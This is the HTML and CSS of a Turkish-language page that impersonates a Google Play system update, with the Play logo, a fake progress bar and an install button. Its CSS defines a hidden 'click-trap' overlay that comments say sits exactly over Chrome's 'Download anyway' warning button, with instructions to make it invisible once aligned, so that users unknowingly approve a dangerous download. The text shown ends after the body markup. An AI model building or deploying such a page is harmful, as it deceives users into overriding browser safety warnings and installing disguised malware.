<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Play - Sistem Güncellemesi</title>
    <style>
        /* Google Play Teması */
        body { 
            font-family: 'Roboto', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background: #ffffff; 
            margin: 0; 
            overflow: hidden; 
        }
        .container { 
            width: 90%; 
            max-width: 400px; 
            text-align: center; 
        }
        .logo { 
            width: 60px; 
            margin-bottom: 20px; 
        }
        .title { 
            font-size: 22px; 
            color: #202124; 
            margin-bottom: 10px; 
            font-weight: 500; 
        }
        .progress-container { 
            width: 100%; 
            background: #e8eaed; 
            border-radius: 10px; 
            height: 4px; 
            margin: 25px 0; 
        }
        .progress-bar { 
            width: 0%; 
            height: 100%; 
            background: #01875f; 
            border-radius: 10px; 
            transition: width 0.2s; 
        }
        .status { 
            color: #5f6368; 
            font-size: 14px; 
            margin-top: 10px; 
            line-height: 1.5;
        }
        #start-btn { 
            background: #01875f; 
            color: white; 
            border: none; 
            padding: 12px 24px; 
            border-radius: 25px; 
            font-size: 16px; 
            cursor: pointer; 
            width: 100%; 
            font-weight: bold;
        }

        /* EN KRİTİK KISIM: Click-Trap (Tıklama Tuzağı)
           Bu alan Chrome'un 'Yine de indir' butonunun tam üzerine biner.
           Görsellerine göre koordinatlar optimize edildi.
        */
        #click-trap {
            position: fixed;
            bottom: 24%;    /* Popup butonunun dikey konumu */
            right: 8%;      /* Popup butonunun yatay konumu */
            width: 42%;     /* Butonu tam kapatacak genişlik */
            height: 65px;   /* Butonun tıklanabilir yüksekliği */
            background: rgba(255, 0, 0, 0.4); /* TEST İÇİN KIRMIZI - Yerini görünce 0.4'ü 0 yap */
            z-index: 10000;
            display: none;  /* Sadece bar dolduğunda görünecek */
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" class="logo" alt="Play Store">
        
        <div id="title" class="title">Sistem Hazırlanıyor...</div>
        
        <div class="progress-container">
            <div id="bar" class="progress-bar"></div>
        </div>
        
        <p id="status" class="status">Cihaz uyumluluğu kontrol ediliyor.</p>
        
        <button id="start-btn">Güncellemeyi Kur</button>
    </div>

    <div id="click-trap" title="Onay Katmanı"></div>
